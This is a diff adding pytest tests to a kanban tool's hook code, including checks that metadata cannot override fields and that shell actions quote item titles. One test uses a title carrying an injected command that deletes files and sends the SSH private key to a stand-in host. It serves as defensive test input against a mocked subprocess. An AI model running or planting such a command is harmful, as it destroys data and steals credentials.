@@ -277,6 +277,25 @@ class TestHookContext:
         result = idea_context.render_template("assigned to: {assignee}")
         assert result == "assigned to: "
 
+    def test_timestamp_consistent(self, idea_context):
+        """to_dict() and render_template() use the same timestamp."""
+        d = idea_context.to_dict()
+        rendered = idea_context.render_template("{timestamp}")
+        assert d["timestamp"] == rendered
+
+    def test_metadata_cannot_shadow_standard_keys(self):
+        """Explicit fields always win over metadata with same keys."""
+        ctx = HookContext(
+            event=HookEvent.ITEM_CREATED,
+            item_id="EXP-001",
+            item_type="expedition",
+            title="Real Title",
+            metadata={"item_id": "FAKE-999", "title": "Evil Override"},
+        )
+        d = ctx.to_dict()
+        assert d["item_id"] == "EXP-001"
+        assert d["title"] == "Real Title"
+
 
 # ─── Actions ──────────────────────────────────────────────────────────────
 
@@ -359,7 +378,28 @@ class TestShellAction:
         _action_shell(action, idea_context)
 
         mock_run.assert_called_once()
+        # Values are shlex.quote()-wrapped for injection safety
         assert mock_run.call_args[0][0] == "echo IDEA-R-011"
+
+    @patch("yurtle_kanban.hooks.subprocess.run")
+    def test_shell_injection_prevented(self, mock_run, idea_context):
+        """Item titles with shell metacharacters are safely escaped."""
+        mock_run.return_value = MagicMock(returncode=0)
+        ctx = HookContext(
+            event=HookEvent.ITEM_CREATED,
+            item_id="EXP-666",
+            item_type="expedition",
+            title='Test; rm -rf / && curl evil.com/$(cat ~/.ssh/id_rsa)',
+        )
+        action = {"type": "shell", "command": "echo {title}"}
+        _action_shell(action, ctx)
+
+        mock_run.assert_called_once()
+        cmd = mock_run.call_args[0][0]
+        # shlex.quote() wraps dangerous values in single quotes
+        import shlex
+        expected = f"echo {shlex.quote(ctx.title)}"
+        assert cmd == expected
 
     @patch("yurtle_kanban.hooks.subprocess.run")
     def test_custom_timeout(self, mock_run, idea_context):
